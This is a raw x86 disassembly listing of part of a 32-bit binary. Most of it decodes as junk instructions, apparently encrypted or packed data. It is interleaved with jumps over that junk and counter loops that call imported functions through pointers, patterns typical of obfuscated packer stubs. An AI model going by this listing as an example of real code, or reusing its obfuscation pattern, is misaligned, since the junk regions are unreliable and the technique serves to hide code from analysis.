  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	push   esp
  4020e5:	pop    ss
  4020e6:	imul   DWORD PTR [eax+0x7e7e0584]
  4020ec:	push   ebp
  4020ed:	jg     0x40216d
  4020ef:	jle    0x40211b
  4020f1:	mov    dh,0x7b
  4020f3:	push   cs
  4020f4:	fsub   QWORD PTR [eax]
  4020f6:	cmp    DWORD PTR [esi],ebx
  4020f8:	aaa    
  4020f9:	int3   
  4020fa:	push   ecx
  4020fb:	sub    eax,0x62112648
  402100:	inc    esp
  402101:	push   ebp
  402102:	out    dx,al
  402103:	adc    DWORD PTR [edx+eiz*1+0x14],edi
  402107:	hlt    
  402108:	inc    ecx
  402109:	jo     0x40214f
  40210b:	sbb    esi,DWORD PTR [edi-0xa]
  40210e:	loope  0x40214f
  402110:	add    bl,BYTE PTR ds:0x6a0ec3ed
  402116:	mov    dl,0x4c
  402118:	ins    BYTE PTR es:[edi],dx
  402119:	adc    eax,0x7dc20466
  40211e:	test   DWORD PTR [edx-0x22],0xd4af7525
  402125:	inc    esi
  402126:	pop    ss
  402127:	in     al,0xaf
  402129:	push   edx
  40212a:	pop    ebp
  40212b:	xlat   BYTE PTR ds:[ebx]
  40212c:	jne    0x40217a
  40212e:	lds    edi,FWORD PTR [esi+0x555e982a]
  402134:	in     al,dx
  402135:	pop    ebx
  402136:	xor    DWORD PTR [ebx+0x203d9ce6],ecx
  40213c:	pop    edi
  40213d:	shl    ebp,1
  40213f:	or     al,BYTE PTR [edx-0x627cd9ae]
  402145:	and    esi,DWORD PTR [edi+0x249b0b12]
  40214b:	push   0x72
  40214d:	xchg   edi,eax
  40214e:	xchg   ecx,eax
  40214f:	xchg   DWORD PTR [esi],esi
  402151:	sbb    DWORD PTR [eax-0x9],edi
  402154:	out    dx,eax
  402155:	cmp    bh,dl
  402157:	(bad)  
  402158:	jno    0x402181
  40215a:	out    dx,eax
  40215b:	jmp    0x402158
  40215d:	data16 (bad) 
  40215f:	(bad)  
  402160:	in     eax,dx
  402161:	and    DWORD PTR [edi-0x2eb6d99e],0x4bb9d112
  40216b:	adc    al,0xd3
  40216d:	inc    ebx
  40216e:	in     eax,0x3f
  402170:	das    
  402171:	jmp    0x4021d2
  402173:	push   ecx
  402174:	adc    eax,0xbc669e7
  402179:	(bad)  
  40217b:	pushf  
  40217c:	jne    0x4021ae
  40217e:	hlt    
  40217f:	call   FWORD PTR [edi+0x55]
  402182:	mov    ds:0x14908b95,eax
  402187:	das    
  402188:	push   0x521af045
  40218d:	push   esi
  40218e:	add    dh,BYTE PTR [edx+eiz*8-0x108c2912]
  402195:	cli    
  402196:	adc    ebx,0x67
  402199:	arpl   WORD PTR [ebx+0x4bad6ad2],bx
  40219f:	pop    esp
  4021a0:	mov    al,0x3f
  4021a2:	cwde   
  4021a3:	scas   eax,DWORD PTR es:[edi]
  4021a4:	pop    ss
  4021a5:	jl     0x40212f
  4021a7:	popf   
  4021a8:	mov    ds:0xa1afb401,al
  4021ad:	xchg   esp,eax
  4021ae:	xchg   edi,eax
  4021af:	fld    TBYTE PTR [esi-0x32c353e]
  4021b5:	push   0x1f3f9dde
  4021ba:	cmc    
  4021bb:	repz push cs
  4021bd:	or     ecx,esp
  4021bf:	and    BYTE PTR [ebp+0x3513bca1],cl
  4021c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c6:	cmc    
  4021c7:	test   eax,0x209d39d0
  4021cc:	inc    ebp
  4021cd:	test   BYTE PTR [esi*1+0xe9b8c0],0xff
  4021d5:	xchg   esp,eax
  4021d6:	push   cs
  4021d7:	repz mov ah,0xb8
  4021da:	push   cs
  4021db:	cmp    eax,0x20f9eba3
  4021e0:	dec    dl
  4021e2:	aam    0x91
  4021e4:	fiadd  DWORD PTR [edi-0x18]
  4021e7:	add    eax,0x3355befe
  4021ec:	cs pop ecx
  4021ee:	in     eax,0xa3
  4021f0:	jecxz  0x4021bf
  4021f2:	push   ecx
  4021f3:	xchg   esp,eax
  4021f4:	outs   dx,DWORD PTR ds:[esi]
  4021f5:	out    0xa3,eax
  4021f7:	vorps  ymm5,ymm1,ymm3
  4021fb:	inc    eax
  4021fc:	mov    dh,0xd8
  4021fe:	aam    0xe7
  402200:	and    BYTE PTR [edx+ebx*8],0x35
  402204:	es (bad) 
  402206:	int3   
  402207:	nop
  402208:	adc    al,0x11
  40220a:	arpl   WORD PTR [esi-0x68225fce],di
  402210:	mov    al,0x3d
  402212:	jmp    0x4d29:0xcfa3829f
  402219:	jle    0x402225
  40221b:	push   es
  40221c:	repz mov edx,0x274a8932
  402222:	sub    al,ch
  402224:	add    esi,DWORD PTR [edi-0x77]
  402227:	les    esp,FWORD PTR [ecx+ecx*2-0x66]
  40222b:	pop    ebp
  40222c:	lods   eax,DWORD PTR ds:[esi]
  40222d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40222e:	and    esi,DWORD PTR [ebp-0x7b]
  402231:	shr    DWORD PTR [ecx+0x3d337072],1
  402237:	mov    DWORD PTR [eax-0x8cd9a39],edx
  40223d:	dec    esp
  40223e:	add    al,0x64
  402240:	mov    DWORD PTR [edi-0x68ce2190],ebx
  402246:	jb     0x402252
  402248:	inc    esp
  402249:	xchg   DWORD PTR ds:0xa7164f06,ebp
  40224f:	xlat   BYTE PTR ds:[ebx]
  402250:	leave  
  402251:	sub    dh,BYTE PTR [esi+0x62]
  402254:	stos   DWORD PTR es:[edi],eax
  402255:	fstp   TBYTE PTR [edx-0x3f]
  402258:	jmp    0x22a8:0x156f6d24
  40225f:	jp     0x4022d1
  402261:	xchg   edx,eax
  402262:	dec    esi
  402263:	sbb    al,0x41
  402265:	add    DWORD PTR [ebp-0x358dcecc],ebp
  40226b:	stc    
  40226c:	fs sti 
  40226e:	ins    DWORD PTR es:[edi],dx
  40226f:	mov    al,0x1d
  402271:	xchg   esi,ebx
  402273:	out    0x98,eax
  402275:	jmp    0x3621c2ce
  40227a:	jbe    0x4022eb
  40227c:	pop    ebp
  40227d:	xchg   ecx,eax
  40227e:	or     eax,0x76b77faf
  402283:	cmp    BYTE PTR [ecx+0x5d99ebf9],al
  402289:	inc    edx
  40228a:	xchg   edx,eax
  40228b:	loop   0x402281
  40228d:	retf   0x9c29
  402290:	pop    es
  402291:	sub    eax,0xf23a31bb
  402296:	inc    edi
  402297:	pop    edx
  402298:	mov    DWORD PTR [edi-0x21],edx
  40229b:	es in  al,0x41
  40229e:	out    0x4,eax
  4022a0:	cmc    
  4022a1:	inc    esp
  4022a2:	xchg   DWORD PTR [esi+ebp*2-0x3b],eax
  4022a6:	push   esi
  4022a7:	push   ebx
  4022a8:	lock test eax,0xab4335c1
  4022ae:	call   0xbad9:0x3150b273
  4022b5:	rcr    ebx,1
  4022b7:	sti    
  4022b8:	and    DWORD PTR [eax+0x42665c2f],ecx
  4022be:	idiv   ebx
  4022c0:	sbb    eax,edx
  4022c2:	jnp    0x4022af
  4022c4:	push   es
  4022c5:	mov    eax,DWORD PTR [ebx-0x29df9bfd]
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42ec6f,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42ec6f
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ec6f,edx
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	aad    0x84
  402363:	xor    eax,0x7e03db35
  402368:	jle    0x4023bf
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023a4
  40236e:	sbb    esp,DWORD PTR [ebx]
  402370:	and    DWORD PTR [eax-0x4dd53a5a],0x23fe579e
  40237a:	pop    ebp
  40237b:	jg     0x4023a7
  40237d:	jno    0x402359
  40237f:	mov    ebp,edx
  402381:	xchg   edx,eax
  402382:	mov    ecx,0xccc1184
  402387:	out    0xb4,eax
  402389:	or     esp,DWORD PTR [eax]
  40238b:	adc    bh,BYTE PTR [ecx+ecx*8]
  40238e:	mov    gs,WORD PTR [ebp-0x25da06c4]
  402394:	scas   al,BYTE PTR es:[edi]
  402395:	dec    ebx
  402396:	stc    
  402397:	jmp    0x891fc539
  40239c:	sub    edi,edi
  40239e:	sahf   
  40239f:	call   0x3ac5:0xa0a761a8
  4023a6:	xor    BYTE PTR [esp+eax*8+0x23],ah
  4023aa:	pop    ss
  4023ab:	xchg   DWORD PTR [esi],ebp
  4023ad:	ret    0x6bed
  4023b0:	lods   eax,DWORD PTR ds:[esi]
  4023b1:	jnp    0x402349
  4023b3:	or     DWORD PTR [edi-0x7a],esi
  4023b6:	ret    0x63d
  4023b9:	test   DWORD PTR [edx+eax*4+0x58f9a0a2],ebp
  4023c0:	fs out dx,al
  4023c2:	cwde   
  4023c3:	cwde   
  4023c4:	jno    0x4c4115f6
  4023ca:	imul   edi,DWORD PTR [eax],0xa7d687cc
  4023d0:	aaa    
  4023d1:	push   ebx
  4023d2:	out    0x8b,eax
  4023d4:	xchg   edx,eax
  4023d5:	out    dx,eax
  4023d6:	mov    WORD PTR [ebp-0x2],?
  4023d9:	or     cl,dh
  4023db:	or     eax,0x4f65fc0c
  4023e0:	xchg   BYTE PTR [ebx+0x35c94ab5],ah
  4023e6:	and    eax,ebx
  4023e8:	cld    
  4023e9:	mov    ah,0x2b
  4023eb:	fstp   QWORD PTR [ebp-0x63]
  4023ee:	inc    ebp
  4023ef:	pop    edi
  4023f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023f1:	mov    ds:0xea5b2933,eax
  4023f6:	retf   
  4023f7:	jmp    0x40237a
  4023f9:	jne    0x402460
  4023fb:	(bad)  
  4023fc:	stc    
  4023fd:	pop    ds
  4023fe:	or     eax,0xe51fcdf2
  402403:	xchg   ecx,eax
  402404:	inc    esi
  402405:	(bad)  
  402407:	push   ss
  402408:	add    DWORD PTR ds:0x5f5e982d,esi
  40240e:	jno    0x40245b
  402410:	push   cs
  402411:	cs inc edi
  402413:	cmp    al,0x1f
  402415:	dec    ebp
  402416:	aas    
  402417:	std    
  402418:	fimul  DWORD PTR [eax]
  40241a:	add    dh,BYTE PTR [ebp+0x20]
  40241d:	outs   dx,DWORD PTR ds:[esi]
  40241e:	fistp  QWORD PTR [ecx-0x577d4ee0]
  402424:	push   0xd7d5c98f
  402429:	inc    edx
  40242a:	mov    esi,DWORD PTR ds:0xa8c7d28a
  402430:	add    esp,DWORD PTR [ecx-0x1]
  402433:	shl    ch,0xf0
  402436:	stos   BYTE PTR es:[edi],al
  402437:	mov    ch,0x6c
  402439:	push   eax
  40243a:	lea    edi,[edi+0x184f2afb]
  402440:	call   0x99400a7b
  402445:	test   DWORD PTR [edi+0x7f],eax
  402448:	ror    dh,cl
  40244a:	aaa    
  40244b:	hlt    
  40244c:	pop    ecx
  40244d:	into   
  40244e:	and    ch,BYTE PTR [eax-0x2f]
  402451:	add    ch,al
  402453:	xor    BYTE PTR [esi],dl
  402455:	push   ds
  402456:	lahf   
  402457:	xlat   BYTE PTR ds:[ebx]
  402458:	lock and dh,ah
  40245b:	test   al,0xa8
  40245d:	fadd   DWORD PTR [ecx]
  40245f:	int    0x84
  402461:	jo     0x40244e
  402463:	add    bh,0x19
  402466:	stc    
  402467:	ss cmp dl,ch
  40246a:	pop    eax
  40246b:	stos   BYTE PTR es:[edi],al
  40246c:	mov    ?,WORD PTR [esi]
  40246e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40246f:	es or  bh,bh
  402472:	push   0xffffffd9
  402474:	ret    
  402475:	shr    DWORD PTR [edx-0x3b9e5d7c],0x75
  40247c:	xchg   edi,eax
  40247d:	icebp  
  40247e:	adc    esp,DWORD PTR [edx+0x53a651cb]
  402484:	push   0xffffffe4
  402486:	cmp    ch,BYTE PTR [ebp-0x70c6c1b8]
  40248c:	loope  0x4024c2
  40248e:	push   0xd0ebf01f
  402493:	jnp    0x4024f7
  402495:	xchg   esi,eax
  402496:	mov    dh,0x7c
  402498:	sbb    al,0xad
  40249a:	push   edx
  40249b:	jmp    0xfc9e:0x9edddd51
  4024a2:	(bad)  
  4024a4:	inc    esp
  4024a5:	push   ecx
  4024a6:	out    dx,eax
  4024a7:	mov    ecx,0xc2fc552d
  4024ac:	into   
  4024ad:	dec    edx
  4024ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024af:	jmp    0xcea476c5
  4024b4:	jns    0x402444
  4024b6:	lock jo 0x4024b5
  4024b9:	push   ecx
  4024ba:	fdivr  DWORD PTR [eax]
  4024bc:	cmp    ecx,ebp
  4024be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024bf:	test   dh,cl
  4024c1:	ins    DWORD PTR es:[edi],dx
  4024c2:	and    al,0xc
  4024c4:	dec    esp
  4024c5:	and    ch,BYTE PTR [esi+0x7f]
  4024c8:	rol    BYTE PTR [ebx+0x755758e8],cl
  4024ce:	jno    0x4024de
  4024d0:	pop    eax
  4024d1:	sahf   
  4024d2:	push   eax
  4024d3:	xor    ecx,eax
  4024d5:	inc    DWORD PTR gs:[ebp+0x96b8d61]
  4024dc:	ds mov bh,0x88
  4024df:	retf   
  4024e0:	xor    BYTE PTR [ebx+0x4e],dh
  4024e3:	push   esp
  4024e4:	int3   
  4024e5:	mov    esi,0x3c04cf54
  4024ea:	and    eax,0xe5060b3a
  4024ef:	rcl    BYTE PTR [edx],1
  4024f1:	lds    edx,FWORD PTR [ebx+0x5c]
  4024f4:	retf   
  4024f5:	test   al,0x5c
  4024f7:	(bad)  
  4024f9:	mov    ebp,0x87815c6f
  4024fe:	repnz push cs
  402500:	jb     0x40248c
  402502:	mov    DWORD PTR [eax],esp
  402504:	aad    0x44
  402506:	loopne 0x402567
  402508:	add    eax,DWORD PTR [esi+0x3454bbde]
  40250e:	pushf  
  40250f:	inc    eax
  402510:	addr16 jmp 0x40249c
  402513:	cmc    
  402514:	jg     0x4024e6
  402516:	cmp    eax,esp
  402518:	dec    esp
  402519:	mov    ?,WORD PTR [ecx-0xeb6691c]
  40251f:	add    ebp,DWORD PTR [esi+0x4c]
  402522:	fdivr  st,st(5)
  402524:	cmp    BYTE PTR [ebp+0x75e99e8f],dl
  40252a:	data16 lahf 
  40252c:	xchg   esi,eax
  40252d:	sahf   
  40252e:	sbb    DWORD PTR [esi-0x72],0xffffffe1
  402532:	into   
  402533:	int3   
  402534:	xor    BYTE PTR [ecx],ch
  402536:	fwait
  402537:	aaa    
  402538:	xor    BYTE PTR ds:0xb87d1d38,bh
  40253e:	dec    esp
  40253f:	icebp  
  402540:	push   es
  402541:	call   0xd47f63fc
  402546:	outs   dx,BYTE PTR ds:[esi]
  402547:	repnz push ecx
  402549:	and    DWORD PTR ds:0x42ec4b,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs adc ecx,eax
  402614:	hlt    
  402615:	jb     0x402655
  402617:	add    DWORD PTR [esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x4025e4
  40261f:	sbb    DWORD PTR [ebp-0x3f5cb8ab],ecx
  402625:	aaa    
  402626:	in     eax,0x57
  402628:	fiadd  DWORD PTR [edi+eax*4]
  40262b:	xchg   esp,eax
  40262c:	in     eax,dx
  40262d:	sub    esi,eax
  40262f:	mov    ebx,0x2e49d37
  402634:	(bad)  
  402635:	push   edx
  402636:	aaa    
  402637:	push   cs
  402638:	cmp    eax,0x9bbae7d3
  40263d:	mov    ah,0x14
  40263f:	shr    dl,0xd1
  402642:	cs cmp eax,0xc40020b0
  402648:	into   
  402649:	push   ds
  40264a:	test   DWORD PTR [edi],eax
  40264c:	inc    esi
  40264d:	popf   
  40264e:	mov    ecx,0x44254b13
  402653:	std    
  402654:	fcomp  QWORD PTR cs:[ebp+0x156c1d73]
  40265b:	mov    bl,BYTE PTR [esi]
  40265d:	rol    DWORD PTR [eax+0x4169218],cl
  402663:	push   es
  402664:	jo     0x402629
  402666:	dec    eax
  402667:	mov    BYTE PTR [ebx+0x3e],bl
  40266a:	inc    ecx
  40266b:	not    BYTE PTR [esi-0x6411f057]
  402671:	and    edx,DWORD PTR [ebp-0x2]
  402674:	mov    al,ds:0xf15b3c0c
  402679:	mov    ds:0x1be3033d,al
  40267e:	or     BYTE PTR [edi],0xf1
  402681:	imul   ecx,DWORD PTR [esp+edx*1],0xffffffb7
  402685:	fnstsw WORD PTR [ecx+0x18b18d7d]
  40268b:	dec    ecx
  40268c:	sub    BYTE PTR [eax],0x5d
  40268f:	test   eax,0xd7a6829c
  402694:	dec    ebx
  402695:	dec    ebx
  402696:	fistp  WORD PTR [ebx+0x61]
  402699:	pop    ebx
  40269a:	call   0x67c7:0x8ca68e14
  4026a1:	nop
  4026a2:	sbb    eax,0x5cd5d950
  4026a7:	pop    esp
  4026a8:	xchg   esp,eax
  4026a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026aa:	jg     0x4026e3
  4026ac:	fisub  DWORD PTR [edx-0x65e63fba]
  4026b2:	lods   al,BYTE PTR ds:[esi]
  4026b3:	pop    ss
  4026b4:	ins    DWORD PTR es:[edi],dx
  4026b5:	popf   
  4026b6:	sub    esp,DWORD PTR [ecx-0x7b]
  4026b9:	push   ds
  4026ba:	mov    bh,0xc6
  4026bc:	fld    TBYTE PTR [edi]
  4026be:	aad    0xdc
  4026c0:	jecxz  0x4026dd
  4026c2:	fdiv   QWORD PTR [ebx-0x6]
  4026c5:	les    edx,FWORD PTR [ecx+0x6e975d05]
  4026cb:	add    esi,DWORD PTR [esi+0x17]
  4026ce:	int    0x2c
  4026d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026d1:	pop    ss
  4026d2:	push   cs
  4026d3:	sub    eax,0x50d5ae78
  4026d8:	jge    0x4026f2
  4026da:	in     eax,0x5a
  4026dc:	scas   al,BYTE PTR es:[edi]
  4026dd:	js     0x40274a
  4026df:	push   esi
  4026e0:	dec    edi
  4026e1:	lahf   
  4026e2:	icebp  
  4026e3:	(bad)  
  4026e5:	push   eax
  4026e6:	lock xor dl,BYTE PTR [esi+0x498a46cc]
  4026ed:	add    DWORD PTR [eax-0x7c],0x4519c08f
  4026f4:	sbb    eax,0x51b8a35e
  4026f9:	pop    esi
  4026fa:	fsub   DWORD PTR [esi+0x2b343b0f]
  402700:	mov    eax,0x69953e7
  402705:	inc    ecx
  402706:	call   0xd481b302
  40270b:	int    0x8e
  40270d:	add    al,0xfe
  40270f:	(bad)  [edi]
  402711:	out    0x7a,eax
  402713:	and    al,0x38
  402715:	or     BYTE PTR ds:0xca2964b7,ah
  40271b:	in     eax,dx
  40271c:	and    edx,eax
  40271e:	and    DWORD PTR [ecx+0x4],esi
  402721:	sbb    BYTE PTR ds:0x1985b834,dh
  402727:	push   edx
  402728:	dec    eax
  402729:	outs   dx,BYTE PTR ds:[esi]
  40272a:	jge    0x4027a9
  40272c:	rcl    BYTE PTR [eax-0x7a447435],1
  402732:	sbb    al,0xdc
  402734:	ret    0x3c96
  402737:	cmp    DWORD PTR [ebp+0x59ec51ae],ebx
  40273d:	data16 ins BYTE PTR es:[edi],dx
  40273f:	jbe    0x402784
  402741:	lods   al,BYTE PTR ds:[esi]
  402742:	or     BYTE PTR [esi+0x496170fa],ah
  402748:	mov    ecx,0xacd6115
  40274d:	adc    ecx,eax
  40274f:	jle    0x4026f4
  402751:	fild   DWORD PTR [ebx+0x6a]
  402754:	repz or DWORD PTR [ebx],eax
  402757:	aam    0x58
  402759:	adc    DWORD PTR ds:0xe61edbc,esi
  40275f:	popa   
  402760:	lock push ecx
  402762:	adc    bh,ch
  402764:	jmp    0x2861:0xbe7ae10c
  40276b:	cs dec edi
  40276d:	dec    ebx
  40276e:	pop    ecx
  40276f:	test   ah,bh
  402771:	and    al,0x84
  402773:	ret    0xac50
  402776:	pop    ebx
  402777:	fmul   DWORD PTR [ecx-0xe]
  40277a:	das    
  40277b:	retf   0x9571
  40277e:	cmp    eax,0x58f9a3eb
  402783:	outs   dx,BYTE PTR ds:[esi]
  402784:	(bad)  
  402785:	pop    ebx
  402786:	fisub  DWORD PTR [ebx+0x2aba7073]
  40278c:	fcomp  DWORD PTR [edi-0x595f1d52]
  402792:	test   BYTE PTR [edi+0x29],bl
  402795:	(bad)  
  402796:	pop    edi
  402797:	xchg   ebx,eax
  402798:	je     0x4027a5
  40279a:	aam    0x91
  40279c:	xchg   esp,eax
  40279d:	pop    esp
  40279e:	popa   
  40279f:	int    0xdb
  4027a1:	sbb    ch,BYTE PTR [eax-0x2a]
  4027a4:	idiv   dh
  4027a6:	aas    
  4027a7:	mov    cl,0x72
  4027a9:	xor    esp,DWORD PTR [ebx]
  4027ab:	enter  0x66ac,0x15
  4027af:	iret   
  4027b0:	cld    
  4027b1:	hlt    
  4027b2:	jge    0x4027b8
  4027b4:	xchg   esi,eax
  4027b5:	jmp    0xd96bffe9
  4027ba:	mov    ah,0x23
  4027bc:	inc    esp
  4027bd:	or     eax,DWORD PTR [edx-0x65]
  4027c0:	mov    eax,0x4d232a3d
  4027c6:	in     eax,dx
  4027c7:	mov    edi,0xad404755
  4027cc:	out    0x96,al
  4027ce:	out    0x42,eax
  4027d0:	jb     0x4027dd
  4027d2:	push   es
  4027d3:	adc    ebx,DWORD PTR [bp+di]
  4027d6:	cs jmp 0x51f0:0xc7805a8d
  4027de:	sub    al,0x77
  4027e0:	cmp    dh,dh
  4027e2:	inc    esi
  4027e3:	jp     0x402809
  4027e5:	add    BYTE PTR [ecx],dh
  4027e7:	rcr    BYTE PTR [edi],cl
  4027e9:	dec    ebp
  4027ea:	mov    eax,0x2fea48af
  4027ef:	ret    0x3e9a
  4027f2:	push   ds
  4027f3:	cwde   
  4027f4:	scas   eax,DWORD PTR es:[edi]
  4027f5:	stc    
  4027f6:	imul   ebx,DWORD PTR [ebx+0xf],0x107d8b57
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edx],esi
  402828:	clc    
  402829:	push   esp
  40282a:	jnp    0x402841
  40282c:	movd   DWORD PTR [esi+0x55],mm7
  402830:	jg     0x4028b0
  402832:	jle    0x402861
  402834:	daa    
  402835:	aas    
  402836:	xchg   BYTE PTR [ecx-0xfb0fd1f],cl
  40283c:	pop    edi
  40283d:	xchg   esi,eax
  40283e:	repz inc DWORD PTR [esi+edx*2-0x20cd2502]
  402846:	iret   
  402847:	fdivrp st(0),st
  402849:	mov    al,ds:0x771c9c62
  40284e:	ins    BYTE PTR es:[edi],dx
  40284f:	xchg   ebx,eax
  402850:	sbb    bh,dh
  402852:	or     eax,DWORD PTR [esi+0x32]
  402855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402856:	mov    ebx,0x9d3a6b86
  40285b:	inc    esp
  40285c:	mov    bh,0xb3
  40285e:	and    BYTE PTR [esi+ebx*4+0x52],ah
  402862:	push   cs
  402863:	jb     0x402806
  402865:	ret    
  402866:	shr    BYTE PTR [ebx],1
  402868:	mov    al,0x4d
  40286a:	gs es jmp 0xb489bcb6
  402871:	mov    bl,0x56
  402873:	mov    al,0x51
  402875:	or     BYTE PTR [esi-0x17e1c703],bh
  40287b:	mov    ecx,0x45c50df7
  402880:	inc    esp
  402881:	sub    BYTE PTR [ebx],ch
  402883:	in     al,dx
  402884:	mov    eax,ds:0xe97df680
  402889:	loop   0x4028f9
  40288b:	cli    
  40288c:	and    esp,ebx
  40288e:	xor    eax,0x9fae4905
  402893:	das    
  402894:	stos   BYTE PTR es:[edi],al
  402895:	jle    0x40281a
  402897:	mov    ebx,DWORD PTR [esi]
  402899:	mov    cl,0x90
  40289b:	loop   0x4028a5
  40289d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40289e:	repz adc BYTE PTR [edi-0x54],bh
  4028a2:	pop    esp
  4028a3:	pop    edi
  4028a4:	pop    es
  4028a5:	(bad)  
  4028a6:	fldenv [ebp+edi*4+0x389893d5]
  4028ad:	adc    BYTE PTR [eax-0x733e773a],dh
  4028b3:	fwait
  4028b4:	retf   
  4028b5:	xchg   ebp,esp
  4028b7:	sbb    BYTE PTR [ecx+0x6e],ah
  4028ba:	test   edi,ebx
  4028bc:	mul    DWORD PTR [edi+esi*8]
  4028bf:	imul   ebx,DWORD PTR [edx-0x77b495db],0x5d37b342
  4028c9:	pusha  
  4028ca:	inc    ebp
  4028cb:	jbe    0x4028cc
  4028cd:	jge    0x40292c
  4028cf:	hlt    
  4028d0:	fwait
  4028d1:	sub    al,0xd2
  4028d3:	loopne 0x402921
  4028d5:	rcl    BYTE PTR [ebx-0xf],cl
  4028d8:	pop    eax
  4028d9:	pop    ecx
  4028da:	jne    0x40291b
  4028dc:	xchg   BYTE PTR [ebx+0x76a99d36],ah
  4028e2:	dec    ebp
  4028e3:	jmp    0x4028b6
  4028e5:	ins    BYTE PTR es:[edi],dx
  4028e6:	retf   
  4028e7:	cmp    eax,0x66048507
  4028ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ed:	fwait
  4028ee:	xor    al,0xd5
  4028f0:	add    DWORD PTR [edx+0x30],ebx
  4028f3:	adc    al,0x8f
  4028f5:	or     ebp,DWORD PTR [esi]
  4028f7:	(bad)  
  4028f8:	cwde   
  4028f9:	or     ebx,DWORD PTR [eax+0x679c9b42]
  4028ff:	sbb    DWORD PTR ds:0x4e47138e,ebx
  402905:	jmp    0x4028bf
  402907:	sub    edi,DWORD PTR [ebx+0x15]
  40290a:	js     0x402905
  40290c:	cmp    ebp,DWORD PTR [ecx+0x55]
  40290f:	jp     0x4028a2
  402911:	in     al,dx
  402912:	sub    bh,ah
  402914:	call   0x31ca640
  402919:	int    0x99
  40291b:	push   cs
  40291c:	or     DWORD PTR [edx+esi*2],edx
  40291f:	sub    al,0x6d
  402921:	cs mov eax,0xf2760042
  402927:	xor    eax,0xd566bb88
  40292c:	fnstcw WORD PTR [ebx]
  40292e:	scas   al,BYTE PTR es:[edi]
  40292f:	or     ebx,DWORD PTR [ebx]
  402931:	outs   dx,BYTE PTR ds:[esi]
  402932:	or     eax,0x995d3590
  402937:	push   ss
  402938:	xlat   BYTE PTR ds:[ebx]
  402939:	xor    ecx,DWORD PTR [ebx+0x6]
  40293c:	int    0x23
  40293e:	lods   eax,DWORD PTR ds:[esi]
  40293f:	(bad)  
  402940:	mov    edx,0x24584305
